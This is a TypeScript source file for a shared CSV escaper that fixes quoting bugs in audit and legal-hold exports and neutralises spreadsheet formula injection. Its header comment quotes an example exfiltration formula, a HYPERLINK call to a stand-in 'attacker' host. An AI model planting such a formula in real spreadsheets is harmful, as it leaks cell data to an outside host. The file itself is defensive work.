/**
 * One CSV escaper for every export endpoint in this codebase.
 *
 * There were three, all subtly different, and two of them were wrong:
 *
 *   - `audit.routes.ts` quoted a field only when it contained a COMMA
 *     (`s.includes(',')`). A value carrying a double quote, a newline or a
 *     carriage return went out raw — a single newline inside `previousState`,
 *     `newState` or `errorCode` silently splits one audit row into two, which
 *     in a tamper-evidence export is the one artefact that must not be
 *     forgeable.
 *   - `legal-hold.routes.ts` unconditionally quoted only `description` and
 *     emitted `caseReference`, `custodianName` and `releaseClosureRef` raw.
 *     All three are free text typed by staff, so a comma in a custodian name
 *     shifted every following column by one for that row.
 *   - `reports.service.ts` had the correct `/[",\n]/` test but still missed a
 *     bare `\r` (Excel on Windows treats a lone CR as a row break).
 *
 * On top of correct RFC-4180 quoting this neutralises spreadsheet formula
 * injection. These exports exist to be opened in Excel by real staff, and a
 * cell whose text begins `=`, `+`, `-`, `@`, TAB or CR is evaluated as a
 * formula by Excel and LibreOffice — so a document title or a custodian name
 * typed as `=HYPERLINK("http://attacker/"&A1)` runs in the reader's
 * spreadsheet, not in ours. Prefixing a single quote is the standard fix: the
 * cell still reads as the original text, it is simply no longer a formula.
 */

// The apostrophe is in this set deliberately, even though RFC 4180 does not
// require quoting it: it means a cell FORMULA_LEAD has just prefixed always
// comes out quoted too, so the prefix can never be mistaken for part of the
// delimiter structure by a lenient parser. The cost is that a name like
// O'Brien gets quoted unnecessarily, which no CSV reader minds.
const NEEDS_QUOTING = /["',\n\r]/;
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/** One CSV field: formula-neutralised, then RFC-4180 quoted when it must be. */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  let s = typeof value === "string" ? value : String(value);
  if (FORMULA_LEAD.test(s)) s = `'${s}`;
  if (NEEDS_QUOTING.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

/** One CSV row from an array of raw values. */
export function csvRow(values: readonly unknown[]): string {
  return values.map(csvCell).join(",");
}

/**
 * A whole CSV document: a header row plus one row per record, joined with
 * CRLF (what RFC 4180 specifies and what Excel expects — LF-only files import
 * as a single line in some Excel versions).
 */
export function toCsv(
  headers: readonly string[],
  rows: readonly (readonly unknown[])[],
): string {
  return [csvRow(headers), ...rows.map(csvRow)].join("\r\n");
}
